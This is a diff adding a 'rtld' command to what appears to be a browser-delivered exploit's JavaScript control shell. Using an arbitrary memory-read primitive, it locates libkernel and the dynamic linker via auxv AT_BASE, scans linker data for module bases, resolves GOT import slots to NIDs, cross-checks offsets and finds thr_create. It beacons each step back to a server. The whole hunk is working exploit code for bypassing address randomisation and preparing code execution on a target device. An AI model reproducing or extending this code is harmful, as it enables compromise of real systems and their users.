@@ -5949,6 +5949,222 @@ function _startWsShell(){
         break;
       }
 
+      case 'rtld':{
+        /* THE LINKER-DATA ROUTE (the principled one - after two march
+         * deaths on garbage clusters): the auxv AT_BASE = the dynamic
+         * linker (ld-elf.so.1-class). Its RW data holds the rtld object
+         * list: EVERY pointer it stored is a REAL module base (Obj_Entry
+         * structures, the link_map). NO clusters, NO marching, NO
+         * garbage: each candidate from ld's data is read for ELF magic
+         * (mapped - rtld's own pointers), and whichever module's GOT
+         * imports libkernel snippets gets the FULL NID walk.
+         * Chain: auxv anchor -> AT_BASE -> ELF -> PT_LOAD RW -> scan
+         * for 16KB-aligned module-band pointers -> per-candidate ELF
+         * magic -> .dynamic -> JMPREL/RELA -> NID <-> GOT <-> lkRVA map
+         * + the 0x3F0/0x410/0xB50 cross-check + thr_create. ALL READS
+         * in mapped modules. THE RVA = the durable artifact. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function RT(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('RT-'+s),false);x.send();}catch(e){}}
+        try{
+          var cfrR=S.cfr;
+          if(!cfrR||cfrR<0x400000000n){reply.err='No cfr';break;}
+          /* (1) lk chain (for the lkRva calc + the exclusion) */
+          var lkBR=0n;
+          {
+            var entR=S.absRead(0x10001c8000n,0x100);
+            var trPR=0n;
+            for(var eiR=0;eiR<entR.length;eiR++){if(entR[eiR]>=0x10001f0000n&&entR[eiR]<0x1000200000n){trPR=entR[eiR];break;}}
+            if(trPR===0n){reply.err='no thread-record ptr';break;}
+            var trR=S.absRead(trPR,0x60);
+            var ptR=0n;
+            for(var tiR=0;tiR<trR.length;tiR++){if(trR[tiR]>=0x880000000n&&trR[tiR]<0x900000000n){ptR=trR[tiR];break;}}
+            if(ptR===0n){reply.err='no pthread ptr';break;}
+            var ndR=ptR,qR=0n;
+            for(var hpR=0;hpR<5;hpR++){
+              var ppR=S.absRead(ndR,0x60);
+              qR=ppR[8];
+              if((qR&0x3fffn)===0x218n&&qR>0x800000000n)break;
+              ndR=qR-0x38n;
+            }
+            if((qR&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+            lkBR=qR-0x6C218n;
+            if(lkBR%0x4000n!==0n){reply.err='lk base unaligned';break;}
+            var canR=S.absRead(lkBR+0x751D0n,8)[0];
+            RT('1 lk=0x'+lkBR.toString(16)+' canary=0x'+canR.toString(16));
+            if(!(canR>0x1000000n)){reply.err='canary fail';break;}
+          }
+          reply.lk='0x'+lkBR.toString(16);
+          /* (2) the auxv: the anchor [4,0x38,5,phnum,6,0x4000], then AT_BASE(7) */
+          var stkR=S.absRead((cfrR/0x4000n)*0x4000n,0x8000);
+          var auxAtR=-1;
+          for(var aiR=0;aiR+5<stkR.length;aiR++){
+            if(stkR[aiR]===4n&&stkR[aiR+1]===0x38n&&stkR[aiR+2]===5n&&stkR[aiR+4]===6n&&stkR[aiR+5]===0x4000n){auxAtR=aiR;break;}
+          }
+          if(auxAtR<2){reply.err='auxv anchor not found';break;}
+          var atbaseR=0n;
+          for(var ajR=auxAtR+6;ajR+1<stkR.length;ajR++){
+            var tR=stkR[ajR];
+            if(tR===0n&&stkR[ajR+1]===0n)break;
+            if(tR===7n&&stkR[ajR+1]>0x800000000n){atbaseR=stkR[ajR+1];break;}
+          }
+          if(!atbaseR){reply.err='no AT_BASE';break;}
+          RT('2 AT_BASE=0x'+atbaseR.toString(16));
+          reply.atbase='0x'+atbaseR.toString(16);
+          /* (3) the interpreter's ELF + phdrs */
+          var ehR=S.absRead(atbaseR,0x40);
+          if(Number(ehR[0]&0xFFFFFFFFn)!==0x464C457Fn){reply.err='AT_BASE not ELF';break;}
+          var phoffR=ehR[4];
+          var phnumR=Number(ehR[6]&0xFFFFn);
+          var phentR=Number((ehR[5]>>48n)&0xFFFFn);
+          RT('3 ld phoff=0x'+phoffR.toString(16)+' phnum='+phnumR);
+          if(phnumR<1||phnumR>32||phentR!==0x38){reply.err='ld phdrs implausible';break;}
+          /* (4) its RW PT_LOADs */
+          var rwSegs=[];
+          for(var piR=0;piR<phnumR;piR++){
+            var phR=S.absRead(atbaseR+phoffR+BigInt(piR*0x38),0x38);
+            var pType=Number(phR[0]&0xFFFFFFFFn);
+            var pFlags=Number(phR[0]>>32n);
+            var pVa=phR[2];
+            var pMsz=phR[5];
+            if(pType===1&&(pFlags&2)&&pMsz>0n&&pMsz<0x100000n)rwSegs.push([atbaseR+pVa,pMsz]);
+          }
+          RT('4 ld RW segs='+rwSegs.length+' total=0x'+rwSegs.reduce(function(s,x){return s+Number(x[1]);},0).toString(16));
+          if(!rwSegs.length){reply.err='ld has no RW segment';break;}
+          /* (5) scan the RW data for rtld-stored module bases:
+           * 16KB-aligned, in [0x100000000, 0x10000000000), not ld/cage/stack/lk */
+          var cands=[],seenC={};
+          for(var sg=0;sg<rwSegs.length;sg++){
+            var sBase=rwSegs[sg][0],sLen=Number(rwSegs[sg][1]);
+            for(var off=0;off<sLen;off+=0x1000){
+              var ws;
+              try{ws=S.absRead(sBase+BigInt(off),0x1000);}catch(e){RT('5 seg'+sg+' THROW@+0x'+off.toString(16));break;}
+              for(var wi=0;wi<ws.length;wi++){
+                var v=ws[wi];
+                if(v<0x100000000n||v>=0x10000000000n)continue;
+                if(v%0x4000n!==0n)continue;
+                if(v===atbaseR)continue;
+                if(v>=lkBR&&v<lkBR+0x200000n)continue;
+                if(S.BASE&&v>=S.BASE&&v<S.BASE+0x8000000n)continue;
+                if(S.lowB&&S.jfuTop&&v>=S.lowB&&v<S.jfuTop)continue;
+                if(v>=0x10001c0000n&&v<0x1000210000n)continue;
+                var kC=v.toString(16);
+                if(seenC[kC])continue;
+                seenC[kC]=1;cands.push(v);
+                RT('v 0x'+v.toString(16));
+              }
+            }
+          }
+          RT('5 candidates='+cands.length);
+          reply.cands=cands.map(function(c){return '0x'+c.toString(16);});
+          /* (6) per-candidate: ELF magic -> the import walk on any importer */
+          var importer=null,imports=null,crossOk=0,thrE=null;
+          for(var ciR=0;ciR<cands.length&&ciR<40;ciR++){
+            var C=cands[ciR];
+            var mgR;
+            try{mgR=S.absRead(C,8)[0];}catch(e){continue;}
+            if(Number(mgR&0xFFFFFFFFn)!==0x464C457Fn){RT('6 0x'+C.toString(16)+' not ELF');continue;}
+            RT('6 0x'+C.toString(16)+' ELF');
+            /* phdrs -> PT_DYNAMIC -> tags */
+            try{
+              var eh2=S.absRead(C,0x40);
+              var phoff2=eh2[4];
+              var phnum2=Number(eh2[6]&0xFFFFn);
+              var phent2=Number((eh2[5]>>48n)&0xFFFFn);
+              if(phnum2<1||phnum2>64||phent2!==0x38){RT('7 0x'+C.toString(16)+' phnum bad');continue;}
+              var dynV2=0n;
+              for(var pj=0;pj<phnum2;pj++){
+                var ph2=S.absRead(C+phoff2+BigInt(pj*0x38),0x38);
+                if(Number(ph2[0]&0xFFFFFFFFn)===2){dynV2=C+ph2[2];break;}
+              }
+              if(!dynV2){RT('7 0x'+C.toString(16)+' no PT_DYNAMIC');continue;}
+              var strtab2=0n,symtab2=0n,jmprel2=0n,pltrelsz2=0n,rela2=0n,relasz2=0n,syment2=24n;
+              var dw2=S.absRead(dynV2,0x500);
+              for(var dj=0;dj+1<dw2.length;dj+=2){
+                var tg=dw2[dj],vl=dw2[dj+1];
+                if(tg===0n)break;
+                if(tg===5n)strtab2=vl;else if(tg===6n)symtab2=vl;else if(tg===23n)jmprel2=vl;
+                else if(tg===2n)pltrelsz2=vl;else if(tg===7n)rela2=vl;else if(tg===8n)relasz2=vl;else if(tg===11n)syment2=vl;
+              }
+              if(strtab2===0n||strtab2>0x800000n||symtab2===0n||symtab2>0x800000n){RT('7 0x'+C.toString(16)+' dyn bad');continue;}
+              /* count import slots + lk-landing GOT values */
+              var offs2=[];
+              if(jmprel2!==0n&&pltrelsz2>0n&&pltrelsz2<0x4000n)offs2.push([jmprel2,pltrelsz2]);
+              if(rela2!==0n&&relasz2>0n&&relasz2<0x20000n)offs2.push([rela2,relasz2]);
+              if(!offs2.length){RT('7 0x'+C.toString(16)+' no relocs');continue;}
+              var nImp=0,nLk=0;
+              var seenS2={};
+              for(var ok2=0;ok2<offs2.length;ok2++){
+                var bR=offs2[ok2][0],lR=Number(offs2[ok2][1]);
+                var rw2=S.absRead(C+bR,Math.min(lR,0x20000));
+                for(var rj=0;rj+2<rw2.length;rj+=3){
+                  var rOff2=rw2[rj],rInfo2=rw2[rj+1];
+                  var typ2=Number(rInfo2&0xFFFFFFFFn);
+                  if(typ2!==6&&typ2!==7)continue;
+                  if(rOff2===0n||seenS2[rOff2.toString(16)])continue;
+                  seenS2[rOff2.toString(16)]=1;
+                  nImp++;
+                  var gv=S.absRead(C+rOff2,8)[0];
+                  if(gv>=lkBR&&gv<lkBR+0x200000n)nLk++;
+                }
+              }
+              RT('8 0x'+C.toString(16)+' imports='+nImp+' lkLanding='+nLk);
+              if(nLk>0&&!importer){
+                /* THE IMPORTER: full NID walk */
+                importer=C;
+                var slots2=[],seenS3={};
+                for(var ok3=0;ok3<offs2.length;ok3++){
+                  var bR3=offs2[ok3][0],lR3=Number(offs2[ok3][1]);
+                  var rw3=S.absRead(C+bR3,Math.min(lR3,0x20000));
+                  for(var rj3=0;rj3+2<rw3.length;rj3+=3){
+                    var rOff3=rw3[rj3],rInfo3=rw3[rj3+1];
+                    var sym3=Number(rInfo3>>32n);
+                    var typ3=Number(rInfo3&0xFFFFFFFFn);
+                    if(typ3!==6&&typ3!==7)continue;
+                    if(rOff3===0n||seenS3[rOff3.toString(16)])continue;
+                    seenS3[rOff3.toString(16)]=1;
+                    slots2.push({rOff:rOff3,sym:sym3});
+                    if(slots2.length>=240)break;
+                  }
+                  if(slots2.length>=240)break;
+                }
+                imports=[];
+                for(var sk=0;sk<slots2.length;sk++){
+                  var symA2=C+symtab2+BigInt(slots2[sk].sym*Number(syment2));
+                  var se2=S.absRead(symA2,0x18);
+                  var stN2=Number(se2[0]&0xFFFFFFFFn);
+                  if(stN2===0)continue;
+                  var strA2=C+strtab2+BigInt(stN2);
+                  if(strA2<C||strA2>C+0x800000n)continue;
+                  var sb2=S.absRead(strA2,12);
+                  var by=[];
+                  for(var q9=0;q9<sb2.length;q9++){var w9=sb2[q9];for(var k9=0;k9<8;k9++)by.push(Number((w9>>BigInt(k9*8))&0xFFn));}
+                  var nid2='';
+                  for(var k10=0;k10<12;k10++){if(by[k10]===0)break;nid2+=String.fromCharCode(by[k10]);}
+                  var gv2=S.absRead(C+slots2[sk].rOff,8)[0];
+                  var rva2=(gv2>lkBR)?Number(gv2-lkBR):-1;
+                  imports.push({nid:nid2,got:'0x'+slots2[sk].rOff.toString(16),lkRva:'0x'+rva2.toString(16)});
+                }
+                var WANT2={'0x3f0':'U5VD1P181iA','0x410':'t1BJfub8VdY','0xb50':'n88vx3C5nW8'};
+                var checks2=[];
+                for(var ck=0;ck<imports.length;ck++){
+                  var w2=WANT2[imports[ck].lkRva.toLowerCase()];
+                  if(w2){var gd=(imports[ck].nid===w2);checks2.push(imports[ck].lkRva+'->'+imports[ck].nid+(gd?' OK':' MISMATCH'));if(gd)crossOk++;}
+                }
+                reply.cross=checks2;
+                for(var tk=0;tk<imports.length;tk++)if(imports[tk].nid==='Tidr0SYRmB4')thrE=imports[tk];
+                RT('9 *** IMPORTER 0x'+C.toString(16)+': '+imports.length+' imports, cross='+crossOk+'/3, thr_create='+(thrE?thrE.lkRva:'n/a')+' ***');
+              }
+            }catch(e3){RT('6 0x'+C.toString(16)+' walk fault: '+String(e3&&e3.message?e3.message:'?'));}
+          }
+          reply.importer=importer?('0x'+importer.toString(16)):null;
+          reply.imports=imports;
+          reply.thrCreate=thrE;
+          reply.crossOk=crossOk;
+          RT('10 done importer='+(importer?('0x'+importer.toString(16)):'none')+' thr_create='+(thrE?thrE.lkRva:'NOT FOUND'));
+        }catch(e2){reply.err='rtld fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
       case 'lcarch':{
         /* THE ALL-IN-ONE (the cross-session-marching lesson): harvest ->
          * cluster -> march (top-down ELF-magic, in-page, per-step beacons)
